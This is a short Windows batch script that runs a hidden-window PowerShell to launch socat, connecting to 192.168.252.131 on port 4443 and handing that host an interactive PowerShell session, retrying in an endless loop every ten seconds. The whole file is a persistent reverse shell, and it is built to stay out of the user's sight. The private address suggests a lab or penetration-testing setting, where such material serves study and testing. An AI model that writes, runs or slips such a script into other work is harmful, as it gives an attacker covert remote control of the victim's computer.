
:shell
PowerShell.exe -windowstyle hidden ".\socat.exe TCP4:192.168.252.131:4443 EXEC:'PowerShell.exe',pipes"

timeout /t 10
goto shell